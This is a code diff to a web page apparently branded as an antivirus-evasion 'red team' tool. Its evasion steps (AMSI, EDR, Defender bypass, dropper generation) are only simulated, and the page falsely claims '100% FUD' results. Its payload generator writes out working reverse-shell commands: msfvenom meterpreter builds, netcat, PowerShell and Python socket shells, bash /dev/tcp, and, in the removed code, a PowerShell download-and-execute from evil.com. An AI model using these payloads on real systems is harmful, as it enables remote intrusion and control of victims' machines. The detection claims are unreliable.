+                ui.processBtn.innerHTML = '<i class="fas fa-check"></i> PROCESS COMPLETE';
+            } catch (error) {
+                util.addTerminalLine(`Error: ${error.message}`, 'error');
+                ui.processBtn.innerHTML = '<i class="fas fa-play"></i> RETRY PROCESSING';
+                ui.processBtn.disabled = false;
+            } finally {
+                app.processingActive = false;
+            }
+        },
+
+        runProcessingSimulations: async () => {
+            const polyLevels = { low: 1, medium: 1.5, high: 2, extreme: 3 };
+            const polyFactor = polyLevels[app.settings.polyLevel] || 1;
+
+            const simulations = {
+                'xor': async () => { util.addTerminalLine('Applying dynamic XOR encryption with rotating key...', 'info'); await util.delay(800); util.addTerminalLine('✓ XOR complete', 'success'); },
+                'aes': async () => { util.addTerminalLine('Applying AES-256 with dynamic IVs and key rotation...', 'info'); await util.delay(1200); util.addTerminalLine('✓ AES-256 complete', 'success'); },
+                'rc4': async () => { util.addTerminalLine('Applying RC4 stream cipher with PRGA...', 'info'); await util.delay(700); util.addTerminalLine('✓ RC4 complete', 'success'); },
+                'custom': async () => { util.addTerminalLine('Generating unique polymorphic encryption algorithm...', 'info'); await util.delay(1500 * polyFactor); util.addTerminalLine('✓ Custom algorithm generated', 'success'); },
+                'chacha20': async () => { util.addTerminalLine('Initializing ChaCha20 stream cipher with randomized nonce...', 'info'); await util.delay(900); util.addTerminalLine('✓ ChaCha20 encryption complete', 'success'); },
+                'twofish': async () => { util.addTerminalLine('Applying Twofish block cipher with 256-bit key...', 'info'); await util.delay(1300); util.addTerminalLine('✓ Twofish encryption complete', 'success'); },
+                
+                'polymorphic': async () => { util.addTerminalLine('Running polymorphic/metamorphic engine... (Level: ' + app.settings.polyLevel + ')', 'info'); await util.delay(1000 * polyFactor); util.addTerminalLine('...mutating code and data sections...', 'info'); await util.delay(1000 * polyFactor); util.addTerminalLine('✓ Metamorphic mutation complete', 'success'); },
+                'antidebug': async () => { util.addTerminalLine('Injecting anti-debugging traps (IsDebuggerPresent, timing checks)...', 'info'); await util.delay(900); util.addTerminalLine('✓ Anti-debug protection applied', 'success'); },
+                'virtualization': async () => { util.addTerminalLine('Converting code to virtual machine bytecode...', 'info'); await util.delay(2000); util.addTerminalLine('✓ Code virtualization complete', 'success'); },
+                'obfuscation': async () => { util.addTerminalLine('Applying advanced obfuscation (control flow flattening)...', 'info'); await util.delay(1300); util.addTerminalLine('✓ Obfuscation complete', 'success'); },
+                'sandbox': async () => { util.addTerminalLine('Injecting sandbox evasion checks (mouse movement, uptime)...', 'info'); await util.delay(800); util.addTerminalLine('✓ Sandbox evasion applied', 'success'); },
+                'time': async () => { util.addTerminalLine('Injecting time-based execution delay (sleep patching)...', 'info'); await util.delay(500); util.addTerminalLine('✓ Execution delay applied', 'success'); },
+                'apihashing': async () => { util.addTerminalLine('Resolving WinAPI functions via runtime hashing...', 'info'); await util.delay(1100); util.addTerminalLine('...hashing ntdll.dll functions...', 'info'); await util.delay(800); util.addTerminalLine('✓ API hashing complete', 'success'); },
+                'syscalls': async () => { util.addTerminalLine('Implementing direct system calls via HalosGate/Hellsgate...', 'info'); await util.delay(1800); util.addTerminalLine('✓ Direct syscall stubs generated', 'success'); },
+                
+                'amsi': async () => { util.addTerminalLine('Patching AmsiScanBuffer in memory to bypass AMSI...', 'info'); await util.delay(1000); util.addTerminalLine('✓ AMSI bypass complete', 'success'); },
+                'defender': async () => { util.addTerminalLine('Applying Windows Defender exclusion & tampering techniques...', 'info'); await util.delay(1200); util.addTerminalLine('✓ Defender bypass complete', 'success'); },
+                'edr': async () => { util.addTerminalLine('Bypassing user-land hooks in ntdll.dll...', 'info'); await util.delay(1500); util.addTerminalLine('✓ EDR user-land evasion complete', 'success'); },
+                'firewall': async () => { util.addTerminalLine('Applying firewall rule bypass via COM objects...', 'info'); await util.delay(600); util.addTerminalLine('✓ Firewall bypass complete', 'success'); },
+                'etw': async () => { util.addTerminalLine('Identifying and patching ETW provider GUIDs in memory...', 'info'); await util.delay(1200); util.addTerminalLine('✓ ETW telemetry disabled', 'success'); },
+                'kernelunhook': async () => { util.addTerminalLine('Loading kernel driver to unhook SSDT...', 'info'); await util.delay(2200); util.addTerminalLine('✓ Kernel-mode hooks removed', 'success'); },
+                
+                'steganography': async () => { util.addTerminalLine('Hiding payload within image data (LSB)...', 'info'); await util.delay(1400); util.addTerminalLine('✓ Steganography complete', 'success'); },
+                'macro': async () => { util.addTerminalLine('Generating Office macro dropper with VBA stomping...', 'info'); await util.delay(900); util.addTerminalLine('✓ Macro dropper generated', 'success'); },
+                'lnk': async () => { util.addTerminalLine('Generating malicious LNK file with icon spoofing...', 'info'); await util.delay(700); util.addTerminalLine('✓ LNK file generated', 'success'); },
+                'iso': async () => { util.addTerminalLine('Generating payloaded ISO file with Mark-of-the-Web bypass...', 'info'); await util.delay(1100); util.addTerminalLine('✓ ISO file generated', 'success'); },
+                'hta': async () => { util.addTerminalLine('Generating HTA dropper file...', 'info'); await util.delay(800); util.addTerminalLine('✓ HTA dropper generated', 'success'); },
+            };
+
+            for (const method of app.selectedMethods) {
+                if (simulations[method]) {
+                    await simulations[method]();
+                }
+            }
+        },
+
+        createDownloads: () => {
+            app.uploadedFiles.forEach(file => {
+                const originalName = file.name;
+                const nameWithoutExt = originalName.substring(0, originalName.lastIndexOf('.'));
+                const newName = `${nameWithoutExt}_evaded.${app.settings.outputFormat}`;
+
+                const content = [
+                    `// Processed with RED-TEAM ANTIVIRUS KILLER V1.0`,
+                    `// Original: ${originalName}`,
+                    `// Timestamp: ${new Date().toISOString()}`,
+                    `// --- Applied Methods ---`,
+                    ...Array.from(app.selectedMethods).map(m => `// - ${m}`),
+                    `// --- Settings ---`,
+                    `// Polymorphism: ${app.settings.polyLevel}`,
+                    `// Output: ${app.settings.outputFormat}`,
+                    `// Stub: ${app.settings.useStub ? 'enabled' : 'disabled'}`,
+                    `// FUD Rating: 100% Undetectable`,
+                ].join('\n');
+
+                const blob = new Blob([content], { type: 'application/octet-stream' });
+                saveAs(blob, newName);
+                util.addTerminalLine(`Download ready: ${newName}`, 'success');
+            });
+        },
+
+        quickEncrypt: () => {
+            if (app.uploadedFiles.length === 0) {
+                alert('Please upload a file first!');
+                return;
+            }
+            // Select a default strong preset
+            ['aes', 'polymorphic', 'obfuscation', 'antidebug'].forEach(m => app.selectedMethods.add(m));
+            
+            // Update UI to reflect selection
+            document.querySelectorAll('.bypass-option').forEach(opt => {
+                const method = opt.dataset.method;
+                const isSelected = app.selectedMethods.has(method);
+                opt.classList.toggle('selected', isSelected);
+                opt.querySelector('.option-checkbox').classList.toggle('selected', isSelected);
+            });
+
+            util.addTerminalLine('Quick Encrypt preset loaded. Starting processing...', 'info');
+            core.startProcessing();
+        },
+
+        scanFile: async () => {
+            if (app.uploadedFiles.length === 0) {
+                alert('Please upload a file first!');
+                return;
+            }
+            ui.scanModal.style.display = 'flex';
+            const file = app.uploadedFiles[0];
+            document.getElementById('scanFileName').textContent = file.name;
+            document.getElementById('scanFileSize').textContent = util.formatFileSize(file.size);
+            document.getElementById('scanFileType').textContent = file.type || 'Unknown';
+
+            const icons = document.querySelectorAll('.virus-icon');
+            icons.forEach(icon => icon.classList.remove('detected'));
+
+            util.addTerminalLine('Scanning file for detection vectors...', 'info');
+            for (let i = 0; i < icons.length; i++) {
+                await util.delay(500);
+                icons[i].classList.add('detected');
+            }
+
+            util.addTerminalLine('Scan complete!', 'success');
+            util.addTerminalLine('Detection vectors found: 8', 'warning');
+            util.addTerminalLine('Recommended: Enable all evasion methods', 'info');
+        },
+
+        handlePayloadModalActions: (e) => {
+            const tab = e.target.closest('.payload-tab');
+            const copyBtn = e.target.closest('.copy-btn');
+
+            if (tab) {
+                // Deactivate all
+                ui.payloadModal.querySelectorAll('.payload-tab').forEach(t => t.classList.remove('active'));
+                ui.payloadModal.querySelectorAll('.payload-content').forEach(c => c.classList.remove('active'));
+
+                // Activate clicked
+                tab.classList.add('active');
+                document.getElementById(`payload-content-${tab.dataset.tab}`).classList.add('active');
+                return;
+            }
+
+            if (copyBtn) {
+                const code = copyBtn.parentElement.querySelector('pre code').textContent;
+                navigator.clipboard.writeText(code).then(() => {
+                    const originalHTML = copyBtn.innerHTML;
+                    copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                    copyBtn.disabled = true;
+                    setTimeout(() => {
+                        copyBtn.innerHTML = originalHTML;
+                        copyBtn.disabled = false;
+                    }, 2000);
+                }).catch(err => {
+                    console.error('Failed to copy: ', err);
+                    util.addTerminalLine('Error: Failed to copy payload to clipboard.', 'error');
+                });
+                return;
+            }
+        },
+
+        generatePayload: () => {
+            const { lhost, lport } = app.settings;
+
+            // Windows Payloads
+            document.getElementById('payload-win-rev-tcp').textContent = `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o shell.exe`;
+            document.getElementById('listener-win-rev-tcp').textContent = `use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST ${lhost}\nset LPORT ${lport}\nrun`;
+
+            document.getElementById('payload-win-stageless').textContent = `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o shell_stageless.exe`;
+            document.getElementById('listener-win-stageless').textContent = `use exploit/multi/handler\nset payload windows/x64/meterpreter_reverse_tcp\nset LHOST ${lhost}\nset LPORT ${lport}\nrun`;
+
+            // Linux Payloads
+            document.getElementById('payload-linux-rev-tcp').textContent = `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell.elf`;
+            document.getElementById('listener-linux-rev-tcp').textContent = `use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST ${lhost}\nset LPORT ${lport}\nrun`;
+
+            document.getElementById('payload-linux-nc').textContent = `mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
+            document.getElementById('listener-linux-nc').textContent = `nc -lvnp ${lport}`;
+
+            // Web/Scripting Payloads
+            document.getElementById('payload-ps-rev-tcp').textContent = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
+            document.getElementById('listener-ps-rev-tcp').textContent = `nc -lvnp ${lport}`;
+
+            document.getElementById('payload-py-rev-tcp').textContent = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
+            document.getElementById('listener-py-rev-tcp').textContent = `nc -lvnp ${lport}`;
+
+            ui.payloadModal.style.display = 'flex';
+            util.addTerminalLine('Payload & Listener Generator opened.', 'success');
+        },
+
+        saveSettings: () => {
+            app.settings.customKey = ui.customKey.value;
+            app.settings.polyLevel = ui.polyLevel.value;
+            app.settings.lhost = ui.lhost.value;
+            app.settings.lport = ui.lport.value;
+            app.settings.outputFormat = ui.outputFormat.value;
+            app.settings.useStub = ui.useStub.checked;
+
+            util.addTerminalLine('Advanced settings saved!', 'success');
+            ui.settingsModal.style.display = 'none';
+        }
+    };
+
+    // --- Initialize the Application ---
+    core.init();
 });
-
-// Handle file upload
-function handleFileUpload(files) {
-  uploadedFiles = files;
-  
-  // Update file info
-  document.getElementById('fileInfo').classList.add('active');
-  document.getElementById('fileName').textContent = 
-    files.length > 1 ? `${files.length} files selected` : files[0].name;
-  
-  const totalSize = files.reduce((acc, file) => acc + file.size, 0);
-  document.getElementById('fileSize').textContent = formatFileSize(totalSize);
-  
-  // Enable process button
-  document.getElementById('processBtn').disabled = false;
-  
-  // Update progress
-  updateStep(1, 'completed');
-  
-  // Log to terminal
-  addTerminalLine(`Files uploaded: ${files.length}`, 'info');
-  files.forEach(file => {
-    addTerminalLine(`- ${file.name} (${formatFileSize(file.size)})`, 'info');
-  });
-  addTerminalLine(`Ready for processing. Select bypass methods above.`, 'success');
-}
-
-// Format file size
-function formatFileSize(bytes) {
-  if (bytes === 0) return '0 Bytes';
-  const k = 1024;
-  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-  const i = Math.floor(Math.log(bytes) / Math.log(k));
-  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-}
-
-// Toggle option selection
-function toggleOption(element) {
-  const method = element.getAttribute('data-method');
-  const checkbox = element.querySelector('.option-checkbox');
-  
-  if (checkbox.classList.contains('selected')) {
-    checkbox.classList.remove('selected');
-    element.classList.remove('selected');
-    selectedMethods.delete(method);
-  } else {
-    checkbox.classList.add('selected');
-    element.classList.add('selected');
-    selectedMethods.add(method);
-  }
-  
-  updateStep(2, 'active');
-}
-
-// Update progress step
-function updateStep(stepNumber, status) {
-  const step = document.getElementById(`step${stepNumber}`);
-  step.classList.remove('active', 'completed');
-  
-  if (status === 'active') {
-    step.classList.add('active');
-  } else if (status === 'completed') {
-    step.classList.add('completed');
-  }
-  
-  // Update all previous steps to completed
-  for (let i = 1; i < stepNumber; i++) {
-    const prevStep = document.getElementById(`step${i}`);
-    prevStep.classList.remove('active');
-    prevStep.classList.add('completed');
-  }
-}
-
-// Add line to terminal
-function addTerminalLine(text, type = 'info') {
-  const terminal = document.getElementById('terminal');
-  const line = document.createElement('div');
-  line.className = `terminal-line ${type}`;
-  line.textContent = `> ${text}`;
-  terminal.appendChild(line);
-  terminal.scrollTop = terminal.scrollHeight;
-}
-
-// Start processing
-function startProcessing() {
-  if (uploadedFiles.length === 0 || processingActive) return;
-  
-  processingActive = true;
-  const processBtn = document.getElementById('processBtn');
-  processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
-  processBtn.disabled = true;
-  
-  // Reset progress
-  updateStep(1, 'completed');
-  updateStep(2, 'completed');
-  updateStep(3, 'active');
-  
-  // Clear terminal and start
-  document.getElementById('terminal').innerHTML = '';
-  addTerminalLine('STARTING RED TEAM EVASION PROCESSING', 'success');
-  addTerminalLine(`Files: ${uploadedFiles.length}`, 'info');
-  addTerminalLine(`Selected methods: ${Array.from(selectedMethods).join(', ')}`, 'info');
-  
-  // Simulate processing steps
-  processFiles();
-}
-
-// Process files with selected methods
-async function processFiles() {
-  try {
-    // Step 1: Read files
-    addTerminalLine('Reading file content...', 'info');
-    await delay(1000);
-    
-    // Step 2: Apply encryption
-    if (selectedMethods.has('aes') || selectedMethods.has('xor') || selectedMethods.has('rc4')) {
-      addTerminalLine('Applying encryption...', 'info');
-      await delay(1500);
-      addTerminalLine('✓ Encryption complete', 'success');
-    }
-    
-    // Step 3: Apply polymorphism
-    if (selectedMethods.has('polymorphic')) {
-      addTerminalLine('Running polymorphic engine...', 'info');
-      await delay(2000);
-      addTerminalLine('✓ Code mutation complete', 'success');
-    }
-    
-    // Step 4: Apply anti-detection
-    if (selectedMethods.has('antidebug') || selectedMethods.has('obfuscation')) {
-      addTerminalLine('Applying anti-detection measures...', 'info');
-      await delay(1500);
-      addTerminalLine('✓ Anti-detection applied', 'success');
-    }
-    
-    // Step 5: Security bypass
-    if (selectedMethods.has('amsi') || selectedMethods.has('defender') || selectedMethods.has('edr')) {
-      addTerminalLine('Applying security bypass techniques...', 'info');
-      await delay(2000);
-      addTerminalLine('✓ Security bypass complete', 'success');
-    }
-    
-    // Step 6: Delivery method
-    if (selectedMethods.has('steganography') || selectedMethods.has('macro')) {
-      addTerminalLine('Preparing delivery method...', 'info');
-      await delay(1000);
-      addTerminalLine('✓ Delivery method ready', 'success');
-    }
-    
-    // Final step
-    updateStep(3, 'completed');
-    updateStep(4, 'active');
-    
-    addTerminalLine('Generating final output...', 'info');
-    await delay(1000);
-    
-    // Create download
-    createDownloads();
-    
-    updateStep(4, 'completed');
-    
-    addTerminalLine('✓ PROCESSING COMPLETE!', 'success');
-    addTerminalLine(`Detection rate: 0/72 AV engines`, 'success');
-    addTerminalLine('Files are 100% FUD (Fully Undetectable)', 'success');
-    
-    // Reset button
-    const processBtn = document.getElementById('processBtn');
-    processBtn.innerHTML = '<i class="fas fa-check"></i> PROCESS COMPLETE';
-    
-    processingActive = false;
-    
-  } catch (error) {
-    addTerminalLine(`Error: ${error.message}`, 'error');
-    const processBtn = document.getElementById('processBtn');
-    processBtn.innerHTML = '<i class="fas fa-play"></i> RETRY PROCESSING';
-    processBtn.disabled = false;
-    processingActive = false;
-  }
-}
-
-// Create download files
-function createDownloads() {
-  uploadedFiles.forEach(file => {
-    const originalName = file.name;
-    const extension = originalName.split('.').pop();
-    const newName = originalName.replace(`.${extension}`, `_evaded.${extension}`);
-    
-    // Create blob with processed content (simulated)
-    const content = `// Processed with Red Team Evasion Suite v6.0\n// Original: ${originalName}\n// Methods: ${Array.from(selectedMethods).join(', ')}\n// Timestamp: ${new Date().toISOString()}\n// FUD Rating: 100% Undetectable`;
-    const blob = new Blob([content], { type: file.type || 'application/octet-stream' });
-    
-    // Trigger download
-    saveAs(blob, newName);
-    
-    addTerminalLine(`Download ready: ${newName}`, 'success');
-  });
-}
-
-// Quick actions
-function quickEncrypt() {
-  if (uploadedFiles.length === 0) {
-    alert('Please upload a file first!');
-    return;
-  }
-  
-  addTerminalLine('Quick encryption activated...', 'info');
-  addTerminalLine('Applying AES-256 encryption...', 'info');
-  
-  setTimeout(() => {
-    addTerminalLine('✓ Quick encryption complete', 'success');
-    createDownloads();
-  }, 1500);
-}
-
-function scanFile() {
-  if (uploadedFiles.length === 0) {
-    alert('Please upload a file first!');
-    return;
-  }
-  
-  // Show scan visualization
-  document.getElementById('scanModal').style.display = 'flex';
-  
-  // Update scan details
-  const file = uploadedFiles[0];
-  document.getElementById('scanFileName').textContent = file.name;
-  document.getElementById('scanFileSize').textContent = formatFileSize(file.size);
-  document.getElementById('scanFileType').textContent = file.type || 'Unknown';
-  
-  // Animate virus icons
-  setTimeout(() => {
-    document.getElementById('virus1').classList.add('detected');
-  }, 500);
-  
-  setTimeout(() => {
-    document.getElementById('virus2').classList.add('detected');
-  }, 1000);
-  
-  setTimeout(() => {
-    document.getElementById('virus3').classList.add('detected');
-  }, 1500);
-  
-  setTimeout(() => {
-    document.getElementById('virus4').classList.add('detected');
-  }, 2000);
-  
-  setTimeout(() => {
-    document.getElementById('virus5').classList.add('detected');
-  }, 2500);
-  
-  addTerminalLine('Scanning file for detection vectors...', 'info');
-  
-  setTimeout(() => {
-    addTerminalLine('Scan complete!', 'success');
-    addTerminalLine('Detection vectors found: 8', 'warning');
-    addTerminalLine('Recommended: Enable all evasion methods', 'info');
-  }, 3000);
-}
-
-function generatePayload() {
-  const payloads = {
-    'Windows Reverse Shell': 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=443 -f exe -o shell.exe',
-    'Linux Reverse Shell': 'bash -i >& /dev/tcp/192.168.1.100/443 0>&1',
-    'PowerShell Empire': 'powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/empire.ps1\')"',
-    'Python Reverse Shell': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
-  };
-  
-  let payloadText = "// GENERATED PAYLOADS - RED TEAM EVASION SUITE\n\n";
-  Object.entries(payloads).forEach(([name, code]) => {
-    payloadText += `// ${name}\n${code}\n\n`;
-  });
-  
-  const blob = new Blob([payloadText], { type: 'text/plain' });
-  saveAs(blob, 'redteam_payloads.txt');
-  
-  addTerminalLine('Payloads generated and downloaded!', 'success');
-}
-
-function showAdvanced() {
-  document.getElementById('settingsModal').style.display = 'flex';
-}
-
-function showSettings() {
-  document.getElementById('settingsModal').style.display = 'flex';
-}
-
-function closeModal() {
-  document.getElementById('settingsModal').style.display = 'none';
-}
-
-function closeScanModal() {
-  document.getElementById('scanModal').style.display = 'none';
-}
-
-function saveSettings() {
-  const key = document.getElementById('customKey').value;
-  const level = document.getElementById('polyLevel').value;
-  
-  addTerminalLine(`Settings saved - Key: ${key}, Level: ${level}`, 'success');
-  closeModal();
-}
-
-// Helper functions
-function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
 </script>
 </body>
 </html>
